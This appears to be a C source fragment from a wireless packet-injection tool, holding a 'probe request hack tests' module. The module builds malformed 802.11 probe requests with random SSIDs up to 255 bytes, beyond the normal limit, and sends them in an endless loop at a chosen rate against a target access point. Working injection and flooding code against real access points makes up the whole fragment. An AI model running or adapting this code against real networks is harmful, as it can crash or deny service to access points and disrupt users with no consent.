...
int channel_count = 28;                       // Channel counter - 28 default channels
...
void mod_send_probe_req(uchar *macdst,uchar *macsrc,uchar *macbss,int speed,int type,uchar slen) {
	char *rates = "\x01\x04\x82\x84\x8b\x96";
	uchar ssid[255];
	uchar i,c;

	for (i=0;i<255;i++) {
		if (type) c=0x80+(random()%0x80); else c=0x41+(random()%25);
		ssid[i]=c;	
	}
	memset(pkt,0x00,MAX_PACKET_LENGTH);
	pkt[0]=0x40;
	memcpy(pkt+4,macdst,ETH_MAC_LEN);
	memcpy(pkt+10,macsrc,ETH_MAC_LEN);
	memcpy(pkt+16,macbss,ETH_MAC_LEN);
	pkt[25]=slen;
	memcpy(pkt+26,ssid,slen);
	memcpy(pkt+26+slen,rates, 6);
	usleep(speed);
	send_packet(pkt,26+slen+6);
}

void mod_test(uchar *argv[]) {
	uchar macap[ETH_MAC_LEN];
	uchar bcast[ETH_MAC_LEN] = "\xff\xff\xff\xff\xff\xff";
	uchar macsta[ETH_MAC_LEN] = "\xFA\xCE\xFA\xCE\xFA\xCE";
	int speed;

	printf("\n>>> Probe request hack tests - implementation for musket team & friends <<<\n");
	printf("Switching to channel=%s\n",argv[3]);
	set_channel(atoi(argv[3]));
	printf("Targeting AP with bssid=%s\n",argv[4]);
	memcpy(macap,parse_mac(argv[4]),ETH_MAC_LEN);
	printf("Inject speed=%s frames/s\n",argv[5]);
	speed=1000000/atoi(argv[5]);

	while (1) {
		mod_send_probe_req(macap,macsta,macap,speed,1,255);
		mod_send_probe_req(bcast,macsta,macap,speed,1,255);
		mod_send_probe_req(macap,macsta,bcast,speed,1,255);
		mod_send_probe_req(bcast,macsta,bcast,speed,1,255);
		
		mod_send_probe_req(macap,macsta,macap,speed,1,32);
		mod_send_probe_req(bcast,macsta,macap,speed,1,32);
		mod_send_probe_req(macap,macsta,bcast,speed,1,32);
		mod_send_probe_req(bcast,macsta,bcast,speed,1,32);
		
		mod_send_probe_req(macap,macsta,macap,speed,0,255);
		mod_send_probe_req(bcast,macsta,macap,speed,0,255);
		mod_send_probe_req(macap,macsta,bcast,speed,0,255);
		mod_send_probe_req(bcast,macsta,bcast,speed,0,255);
	}
}
